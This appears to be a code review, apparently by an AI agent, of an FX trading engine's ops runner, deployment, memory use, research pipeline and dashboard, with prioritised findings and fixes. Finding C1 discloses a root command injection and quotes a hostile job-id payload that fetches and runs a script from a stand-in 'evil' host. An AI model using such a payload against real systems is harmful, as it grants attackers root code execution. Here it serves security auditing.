# Astra review 2 — FX Engine v2, branch `engine` at 2521e54, `vm-results` at 1a6b24d (2026-11-16 14:36 UTC)

Read: CLAUDE.md, STATUS.md, HANDOVER.md, DAY1_AUDIT.md, GATES.md, EXPERIMENTS.md, REJECTED.md, UI_ACCEPTANCE.md, all of src/, deploy/, ops/,
every ops_*.log and result file on vm-results. Ran the suite: 74 passed. Measured peak memory on real-size synthetic data
(161k weekday M5 rows x 10 pairs; the VM will hold ~226k, so scale the numbers by ~1.4). Rendered the dashboard with Playwright at
390 px and 1400 px on a synthetic ledger. The post-reset VM report is NOT on vm-results yet (last push 14:36 UTC, job logs 001-007 only).

## State of the evidence (what vm-results actually says)
- Every price file on the VM starts 2026-08-17: the 3-year history has never been downloaded there. The research window ends
  2026-05-14, so R0 and batch 3 ran on an EMPTY research view and printed "no data" for every variant, yet both LOGGED a trial
  (m5_rerun.md "Trials logged: 1", batch3.md "Trials logged: 2").
- The `harden` job (earlyoom) has not run: no ops_012.log exists; the queue is paused behind the failed history job.
- 236 cycles, 134 ok = 57%. Cycles are only written while the loop is alive, so the 5-hour freeze is invisible in that number.
- No job longer than about a minute has ever completed through the runner (see H1).

## Prioritised findings

### CRITICAL
C1. **Root command injection through ops/jobs.txt.** `src/fxengine/ops/runner.py:115` builds
`nohup bash -c '{body}; echo $? > {rc}' > {log} 2>&1 & echo $!` where `rc` and `log` contain the job id taken verbatim from the
file (`runner.py:111-112`). `parse_jobs` (`runner.py:49-63`) only checks that the second token is whitelisted; the first token can be
`$(curl${IFS}evil|sh)`. For `harden` the shell runs as root (`runner.py:116`). Anyone who can push to `engine` gets root. Fix:
```python
import re
...
        parts = line.split()
        if len(parts) != 2 or not re.fullmatch(r"[A-Za-z0-9_-]{1,32}", parts[0]):
            bad.append(line)
```
and `shlex.quote(str(log))`, `shlex.quote(str(rc))` in `start_job`. Add a test with a hostile id.

C2. **The runner itself runs as root from the repo checkout** (`deploy/install_ops.sh:18-28`: no `User=`, `ExecStart=.venv/bin/python
-m fxengine.ops.runner` from `src/`). A commit to `engine` is executed as root two minutes later and can read `.env`. "Same trust as git
pull" is wrong: `git pull` ran as the user. Fix: `User=$U` in fxops.service; a sudoers drop-in
`$U ALL=(root) NOPASSWD: /bin/systemctl restart fxengine fxdash, /bin/systemctl is-active fxengine fxdash, /usr/bin/apt-get install -y earlyoom, /bin/systemctl enable --now earlyoom`
and `sudo -n` in front of those four commands in `runner.py:98,100,103` and `JOBS_ROOT`. On GitHub: 2FA, and protect `engine`
against force-push. The write deploy key can push to any branch; keep it, but it is one more reason to run the runner unprivileged.

### HIGH
H1. **Jobs almost certainly die when the oneshot service exits.** `fxops.service` is `Type=oneshot` (`install_ops.sh:21`) with the
default `KillMode=control-group`; the job is a `nohup ... &` child in that cgroup (`runner.py:115`). `nohup` ignores SIGHUP, not the
SIGTERM systemd sends when the unit deactivates. Consistent with vm-results: every job that "finished" took seconds; `history` and `r0`
on real data never have. I could not verify this (no systemd in my sandbox): queue `tests` (about one minute) and watch whether it is
reported "FAILED, queue paused" with rc -1 after the next tick. Fix (also fixes H3, H4, H8):
```python
cmd = (f"systemd-run --unit=fxjob-{jid} --uid={USER} --gid={USER} --nice=19 -p IOSchedulingClass=idle "
       f"-p MemoryMax=600M -p MemorySwapMax=256M -p WorkingDirectory={REPO} -E PYTHONPATH=src --collect "
       f"bash -c {shlex.quote(body + f'; echo $? > {rc}')} > {log} 2>&1")
```
(run as root, so `sudo -n systemd-run ...` after C2), track `systemctl is-active fxjob-{jid}` instead of `pid_alive`, and `kill` becomes
`systemctl stop fxjob-{jid}`.

H2. **Rollback loop.** `runner.py:88-107`: after a rollback the next tick sees `local != remote` again, merges, restarts both services,
sleeps 25 s, rolls back again: every 2 minutes, forever, with two Telegram messages per tick and the live loop restarted each time.
Same for `merge-failed` (`runner.py:92-94`), which notifies every tick. Fix: `st["bad_remote"] = remote` on rollback/merge failure,
return early in `sync_code` while `remote == st.get("bad_remote")`; pass `st` into `sync_code`.

H3. **The deploy health check cannot see a crash loop.** `runner.py:99-100` checks `is-active` 25 s after restart; a loop that dies on its
first cycle (next 5-minute mark + 20 s) shows `active` under `Restart=always`. Fix: before merging, `python -c "import
fxengine.live.loop, fxengine.ops.runner"` on the fetched tree (`git show origin/engine:...` into a temp dir, or `git worktree`), and after
restart require `systemctl show -p NRestarts --value fxengine` to be 0 after 90 s.

H4. **Memory: the three jobs do not fit next to the two services, and the guard is not in place.** Measured peaks (synthetic, 161k rows;
VM ~1.4x): `data.build` 281 MB, `run_batch3 E6` 352 MB, `run_m5` above 467 MB and still climbing, dashboard build 324 MB, ONE live-loop
cycle 351 MB. The two services alone sit near 650 MB resident because `loop.data_age_min` (`live/loop.py:41-48`), `scan.scan`,
`loop.replay` and five functions in `dashboard/build.py` each read the FULL M5 parquet of every pair just to look at the last rows.
Add a research job and the box swaps, which is the freeze in DAY1_AUDIT. earlyoom is not installed (no ops_012.log), and with its
defaults (`-m 10 -s 10`) it only acts when free RAM AND free swap are both under 10%: with 2 GB swap that is hours of thrashing first.
Smallest fixes: (a) `MemoryMax=600M` on jobs via systemd-run (H1); (b) `/etc/default/earlyoom`:
`EARLYOOM_ARGS="-m 15 -s 100 -r 0 --prefer '^python3' --avoid 'fxengine.live.loop|fxengine.dashboard'"` and `sysctl vm.swappiness=10`;
(c) stop reading whole files for the last row: in `store.merge_save` write `df.to_parquet(tmp, row_group_size=2048)` and add
```python
def load_tail(symbol, tf, rows=3000, root=ROOT):
    p = path(symbol, tf, root)
    if not p.exists(): return pd.DataFrame()
    with open(p, "rb") as f:
        pf = pq.ParquetFile(f); n = pf.metadata.num_row_groups
        k = max(1, -(-rows // 2048))
        return pf.read_row_groups(list(range(max(0, n - k), n))).to_pandas()
```
and use it in `data_age_min`, `scan` (price and age only), `dashboard.health/key_levels/pair_table/candle_data`, and in `replay`
(rows since `created`). The live loop then stays under ~120 MB and the dashboard under ~150 MB.

H5. **The trial registry on the VM is wrong in both directions.** It contains only what the VM logged (R0, E6) and lacks the 10 historical
trials, so the Bonferroni divisor is 2 instead of 12; and `run_m5.py:198` / `run_batch3.py:121` log a trial BEFORE checking that the
research view is non-empty, so two "trials" with zero setups now sit in it. Fix: commit `docs/trials.jsonl` seeded with the 10
historical names (they are all in the code and docs); in both runners, right after `research_view`:
```python
if all(len(f) == 0 for f in m5s.values()):
    sys.exit("research window empty: stored data starts after HOLDOUT_START; run the history job first")
```
and move `log_trial` to after a run with scored > 0.

H6. **E7 cannot fetch rates as written.** `data/rates.py:13` uses `https://fred.stlouisfed.org/graph/fred.csv?id=`; the keyless CSV
endpoint is `.../graph/fredgraph.csv?id=`. The response will be an HTML page, `parse_fred` will raise or yield "column missing", and
E7 is skipped every time. The series IDs themselves are fine: `IR3TIB01USM156N` is live on FRED (updated Jan 2026) and the EZ/GB/JP/
CH/AU/CA/NZ siblings exist. Other things that can go wrong: FRED's first header is now `observation_date` (handled positionally), `.`
for missing (handled), US series semantics changed after LIBOR ended in 2023 (OECD switched the underlying rate; a level jump mid-sample
is possible), and the 45-day lag is an assumption, not the OECD release calendar (MEI is typically 4-6 weeks). Fix the URL, and make
`parse_fred` raise on `text.lstrip().startswith("<")`. Also log the fetched last dates in `docs/results/batch3.md` so the lag can be checked.

H7. **Dashboard is unreadable on a phone** (`dashboard/build.py:712-713`, JS `chart()`): 5 x-axis labels of 12 characters are drawn
regardless of width; at 390 px 19 of 20 trade-card labels and 4 of 5 Charts-tab labels overlap into a smear, the NOW tag and level
names run past the right edge, and candle bodies are 1.3 px wide (screenshots in my scratchpad). UI_ACCEPTANCE's "readable on a phone"
is not met. Fix in `chart()`: `const nl=sm?3:5` and date-only labels when `sm`; `n: sm?40:100` candles; `R=sm?70:110`; wrap the right
labels in a `<clipPath>`; drop the `prev day low/high` text labels when `sm`.

H8. **Remote kill does not kill the job.** `runner.py:173` sends TERM to the wrapper's direct children only; for `batch3` (`bash
deploy/run_batch3.sh` -> python) and `history` (`a && b`) the python process is a grandchild and keeps running while the job is reported
FAILED. Fix: `systemctl stop fxjob-{jid}` (H1), or `setsid` at start and `kill -TERM -- -{pgid}`.

### MEDIUM
M1. `sync_code` merges and restarts while a job runs (`runner.py:185-196`): a multi-step job (`run_batch3.sh`, `research_once.sh`) can run
half old, half new code. Skip `sync_code` while `st["running"]`.
M2. PID reuse after reboot (`runner.py:66-71,188`): a recycled pid keeps the queue blocked indefinitely. Fixed by unit tracking (H1).
M3. `push_results` failures (revoked or missing deploy key, `runner.py:149-154`) only reach the journal; results stop silently. Notify once per distinct error string.
M4. `full_research`, `rates`, `tests` run un-niced (`runner.py:23-26`); `full_research` is the heaviest job of all.
M5. State and `data/` are created by root (`runner.py:44-46,203`); if `data/` ever has to be recreated the user's loop cannot write it. Fixed by C2.
M6. `dashboard/serve.py:63-72`: when `build()` raises, every request starts another failing rebuild and the wait page reloads every 4 s. Add a 60 s backoff after an error and serve the last good page with a banner.
M7. The page is 993 KB and a rebuild every 30 s (`candle_data` 10 pairs x 3 timeframes x 300 candles, replays of open plus 6 closed setups): fine here (1.5 s), 10-20 s on a shared-core e2-micro, a permanent CPU drain. Raise `--cache` to 120 and load each pair once per build.
M8. `build.py:366-367`: "Hypothetical balance" includes floating P&L before costs; the tile says "start £2,500" only. Label it "incl. open positions before costs" or exclude floating.
M9. `ops_chips` (`build.py:292-305`) calls cycle success "uptime". Cycles are not written while frozen, so a 5-hour outage does not lower it. Compute expected cycles from the calendar and show recorded/expected as uptime, cycle success separately. Same bias in the 57% figure in DAY1_AUDIT: availability was worse.
M10. `run_batch3.py:32,52`: expiry is 72 h (864 M5 bars) but the tracking window is `hold + 400` bars, so an untriggered setup is dropped as OPEN instead of EXPIRED, and a gap-delayed fill exits later than the Friday flip. Use `hold + 864 + 3`.
M11. E6/E7 semantics (`setups/v3.py:33-47`): after a stop-out the strategy stays flat until the sign flips twice, because `prev` is the state, not the position. EXPERIMENTS.md does not say that. Either write it into the frozen text or re-enter on the next Friday with the same sign (that is a rule change: new trial).
M12. R0 challenger (`run_m5.py:146-168`) samples any bar, including 21:00+ thin hours at 2.5x cost, while v1 only trades 07-19 UTC: the challenger is slightly handicapped. Sample from the type's own hour window.
M13. `oanda.py:42-45` retries 401 twice with 30 s sleeps: a dead token now costs 60 s per cycle before the alert path. Harmless but pointless; OANDA 401s are not transient. Keep one retry of 10 s at most.
M14. `watchdog.py` restarts the loop when the heartbeat is older than 12 min, but a 401 cycle still writes the heartbeat, so the watchdog never acts on a dead token. Correct by design; say so in DAY1_AUDIT instead of "the engine kept erroring".

### LOW
L1. `docs/trials.jsonl` is in `RESULT_GLOBS` but absent from vm-results although R0 claims to have logged one: check it exists on the VM.
L2. `control.txt` keys are the literal line, so `resume 1` can never be reused; document that each resume needs a new token.
L3. DAY1_AUDIT says earlyoom "installs on next boot": it is a queued job behind a paused queue.
L4. `report.py` prints raw tuples for the last cycles; fine for a log, not for a human.
L5. HANDOVER records that the off-host dead-man was declined; the System tab should then show "no external alert if this VM dies" so the gap is visible, not just recorded.

## 2. Memory budget (measured, sandbox, 161k rows; VM ~1.4x)
| process | peak RSS | notes |
|---|---|---|
| fxengine live loop, one cycle | 351 MB | reads every pair's full M5 file each cycle |
| fxdash build | 324 MB | resident between builds; rebuilds every 30 s |
| data.build | 281 MB | one pair at a time; fits |
| run_batch3 E6 | 352 MB, 112 s | fits alone, not beside the two services |
| run_m5 (R0) | > 467 MB after 3 min, still running | does not fit; on the VM expect 650 MB+ and hours |
Conclusion: with both services resident (~650 MB on the VM) any research job pushes the box into swap. Do H4(a)-(c) before queuing R0
again; with (c) the services drop to ~250 MB together and R0 under a 600 MB cap fits.

## 3. Batch 3 correctness
- Daily bars (`data/daily.py`): DST-safe (wall-clock bucket keys, 17:00 never ambiguous), forming day dropped, first partial bucket dropped. Correct.
- Signal timing: Friday 17:00 NY close; entry stop at that level; first M5 bar is Sunday 17:00 NY. No look-ahead. The future flip date sets `max_hold_bars`, which is only equivalent to "exit at the flip" if the fill happens on the first bar (M10).
- `_hold_bars` maps calendar exit to M5 bars correctly for an immediate fill.
- Carry (`tracker.py:172-176`): sign and size right (earned is negative cost; 1pp mark-up subtracted once; charged per rollover night incl. Wednesday triple on the entry price). E6 keeps the adverse 0.3 pip model as pre-registered.
- Rates: URL wrong (H6); 45-day lag applied before ffill, so no look-ahead once the URL works.
- Challenger: fair for E6 and E7 (random Friday, random direction, same ATR multiples, real hold lengths, carry by its own direction).
- Measured on synthetic data E6 scored 123 setups, so the machinery runs end to end; the number itself means nothing.

## 4. R0 and the cost question
No double counting inside a mode. STRESSED = modelled raw spread x2 + 0.7 pip commission + 2 x 0.6 pip slippage on stop fills: a
Pepperstone worst case, not OANDA. NORMAL = raw spread + commission: Razor-typical. MEASURED = OANDA's own ask-bid, no commission:
the only mode that matches the data source. Reporting all three is the right answer to the owner's worry. Fill rules at M5 resolution
remove most of the same-bar and entry-bar bias; stop entries still fill at next-bar ask + slippage ("market at open"), which is realistic.
Cooldown and trailing logic are correct. So: "no edge" is NOT yet supported for the H4 variants or batch 3, because R0 has never run on
data; it IS supported for v1 M15/H1 (negative at normal cost already, so MEASURED cannot rescue them).

## 5. Live loop and dashboard
Calendar, replay, dedupe and retry are sound. The 401 path alerts with instructions (good) but see M13/M14. Dashboard numbers are
honest (every tile comes from the ledger or says "unavailable"), except the "uptime" and "balance" labels (M8, M9). Page build cost and
phone layout: H7, M6, M7.

## 6. Reliability gate, realistically
One shared-core VM with two 300 MB services and research on the same box will not reach 99% of cycles; today's own number is 57%
and availability was lower. Causes in order: self-inflicted memory pressure, a single OANDA token that dies when regenerated anywhere,
OANDA practice maintenance (Saturday), GCP live-migration (rare). Cheapest £0 fixes, all within free-tier terms:
1. Memory caps and tail reads (H4). This alone removes the freeze class.
2. Hard-hang auto-reboot: `echo softdog > /etc/modules-load.d/softdog.conf`, `RuntimeWatchdogSec=60s` in `/etc/systemd/system.conf`,
   reboot once. If PID 1 stops responding the kernel reboots the VM. Free, no API, no terms issue.
3. Guest-side self-heal: a 10-minute timer that reboots if `data/heartbeat.json` is older than 30 min during market hours and the
   loop cannot be restarted (`systemctl restart` fails twice).
4. GCP's own automatic restart on host error is already on by default; it does not cover guest hangs, hence 2.
None of these replaces an off-host alert; with it declined, the weekly report must state "no alert if the VM dies".

## Top 5 changes to make first
1. Run the ops runner as the user with a four-line sudoers, and validate job ids (C1, C2). 1 hour.
2. Launch jobs with `systemd-run` units with MemoryMax, track units not pids, stop units on kill (H1, H4a, H8, M2). 2 hours.
3. Tail reads for the loop and dashboard plus `row_group_size` in the store; earlyoom args; swappiness (H4b, H4c). 2 hours.
4. Stop the rollback/merge-failed loop and pre-check the new tree before merging (H2, H3). 1 hour.
5. Seed and commit `docs/trials.jsonl`, refuse to run on an empty research window, log trials only after a scored run, fix the FRED URL (H5, H6). 1 hour.
Then: phone chart fixes (H7), uptime definition (M9), batch 3 window (M10).

## Could not verify
- Whether jobs survive the oneshot unit (H1): no systemd in the review sandbox. One `tests` job on the VM settles it.
- The VM's current state after the reset: vm-results still ends at 14:36 UTC; no post-reset report yet.
- Peak memory of R0 on the real 226k-row files (my run was still climbing past 467 MB on 161k rows when this was written).
- Whether `docs/trials.jsonl` exists on the VM (absent from vm-results).
- FRED fetch end to end (sandbox cannot reach FRED); the URL finding is from the documented endpoint, the series status from FRED's own pages.
- The cause of the second OANDA 401.
